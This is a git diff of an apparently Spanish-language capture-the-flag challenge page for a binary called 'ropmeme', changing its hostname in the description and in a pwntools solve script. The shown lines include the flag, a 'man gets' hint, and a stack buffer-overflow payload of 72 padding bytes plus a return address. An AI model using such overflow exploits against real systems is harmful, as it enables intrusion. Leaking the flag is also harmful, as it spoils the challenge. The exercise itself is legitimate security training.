@@ -5,7 +5,7 @@
 ### Flag: `DCCTF{pwn_c0ld3st_c4t3g0ry}`
 
 ### Descripción:
-Recuperamos este binario de los tiempos en que Intro a la Progra se hacía en C y lo pusimos a correr en [hostname]:5001. Un montón de novatos programando en un lenguaje sin memory safety; que podría salir mal?
+Recuperamos este binario de los tiempos en que Intro a la Progra se hacía en C y lo pusimos a correr en `ropmeme.dcctf.xyz:80`. Un montón de novatos programando en un lenguaje sin memory safety; que podría salir mal?
 
 ### Hint 1:
 `man gets`
@@ -25,7 +25,7 @@ from pwn import *
 
 context.log_level = 'DEBUG'
 #p = process("./ropmeme")
-p = remote("localhost", 5001)
+p = remote("ropmeme.dcctf.xyz", 80)
 
 junk = "A"*72
 payload = junk + p64(0x00401176)
